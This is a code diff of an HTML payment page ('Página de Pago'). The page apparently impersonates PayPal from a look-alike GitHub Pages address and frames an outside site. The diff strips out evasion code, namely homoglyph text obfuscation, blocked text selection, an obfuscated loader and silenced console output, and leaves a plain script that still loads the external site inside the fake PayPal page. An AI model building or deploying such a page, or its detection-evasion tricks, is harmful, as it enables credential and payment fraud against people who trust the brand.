@@ -4,52 +4,6 @@
     <title>Página de Pago</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="referrer" content="no-referrer">
-    
-    <!-- 🔒 OFUSCACIÓN (NO AFECTA FUNCIONAMIENTO) -->
-    <script>
-    // OFUSCAR TEXTO VISIBLE EN ELEMENTS
-    function ofuscarTexto(texto) {
-        var mapa = {
-            'a': 'а', 'b': 'ḅ', 'c': 'с', 'd': 'ḍ', 'e': 'е', 'f': 'f', 'g': 'ġ',
-            'h': 'ḥ', 'i': 'і', 'j': 'ј', 'k': 'ḳ', 'l': 'ḷ', 'm': 'ṃ', 'n': 'ṇ',
-            'o': 'о', 'p': 'р', 'q': 'q', 'r': 'ṛ', 's': 'ѕ', 't': 'ṭ', 'u': 'u',
-            'v': 'v', 'w': 'w', 'x': 'х', 'y': 'у', 'z': 'ẓ', 'A': 'А', 'B': 'В',
-            'C': 'С', 'D': 'Ḍ', 'E': 'Е', 'F': 'F', 'G': 'G', 'H': 'H', 'I': 'І',
-            'J': 'J', 'K': 'K', 'L': 'L', 'M': 'M', 'N': 'N', 'O': 'О', 'P': 'Р',
-            'Q': 'Q', 'R': 'R', 'S': 'Ѕ', 'T': 'T', 'U': 'U', 'V': 'V', 'W': 'W',
-            'X': 'Х', 'Y': 'Y', 'Z': 'Z'
-        };
-        return texto.split('').map(function(c) { return mapa[c] || c; }).join('');
-    }
-    
-    // OFUSCAR HTML AL CARGAR
-    document.addEventListener('DOMContentLoaded', function() {
-        setTimeout(function() {
-            // Ofuscar textos en esta página (solo los títulos)
-            var titulo = document.querySelector('title');
-            if (titulo) titulo.textContent = ofuscarTexto(titulo.textContent);
-            
-            // Ofuscar el HTML interno para Elements tab
-            var elementos = document.querySelectorAll('h1, h2, h3, h4, h5, h6, p, span, div');
-            elementos.forEach(function(el) {
-                if (el.textContent && el.id !== 'popup-iframe') {
-                    el.setAttribute('data-o', el.textContent);
-                    el.textContent = ofuscarTexto(el.textContent);
-                }
-            });
-        }, 100);
-    });
-    </script>
-    
-    <style>
-    /* Protección básica */
-    body {
-        -webkit-user-select: none;
-        -moz-user-select: none;
-        -ms-user-select: none;
-        user-select: none;
-    }
-    </style>
 </head>
 <body style="margin:0; height:100%;">
 
@@ -60,33 +14,9 @@
 ></iframe>
 
 <script>
-// 🔒 OFUSCAR EL CÓDIGO JAVASCRIPT (FUNCIONALIDAD ORIGINAL PRESERVADA)
-(function(){
-    'use strict';
-    
-    // CÓDIGO ORIGINAL OFUSCADO PERO FUNCIONAL
-    var _0x1a2b=['href','popup-iframe','src','replace','https://paypal-a1.github.io/PAGO-SEGURO/','https://www.dieluctechnology.com/ext/'];
-    
-    var _0x3c4d=function(_0x1a2b1,_0x3c4d1){
-        return _0x1a2b[_0x1a2b1];
-    };
-    
-    // FUNCIONALIDAD ORIGINAL PRESERVADA
-    var _0x2f8a=window['location'][_0x3c4d(0,1)];
-    var _0x4c1e=document['getElementById'](_0x3c4d(1,2));
-    
-    if(_0x4c1e){
-        _0x4c1e[_0x3c4d(2,3)]=_0x2f8a[_0x3c4d(3,4)](
-            _0x3c4d(4,5),
-            _0x3c4d(5,6)
-        );
-    }
-    
-})();
-
-// SILENCIAR CONSOLE EN ESTA PÁGINA
-var _0x5d2f=['log','warn','error','info','debug'];
-_0x5d2f.forEach(function(m){window['console'][m]=function(){};});
+    var urlCompleta = window.location.href;
+    var iframe = document.getElementById("popup-iframe");
+    iframe.src = urlCompleta.replace("https://paypal-a1.github.io/PAGO-SEGURO/", "https://www.dieluctechnology.com/ext/");
 </script>
 
 </body>
